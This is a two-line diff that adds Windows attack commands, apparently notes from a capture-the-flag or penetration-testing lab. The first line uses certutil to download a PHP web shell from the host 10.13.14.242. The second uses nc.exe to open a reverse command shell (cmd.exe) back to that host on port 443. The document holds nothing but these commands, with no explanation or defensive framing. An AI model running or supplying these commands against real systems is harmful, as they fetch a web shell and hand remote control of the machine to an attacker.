@@ -1,0 +1,2 @@
+certutil -urlcache -split -f 10.13.14.242/shell.php shell.php
+nc.exe -e cmd.exe 10.13.14.242 443
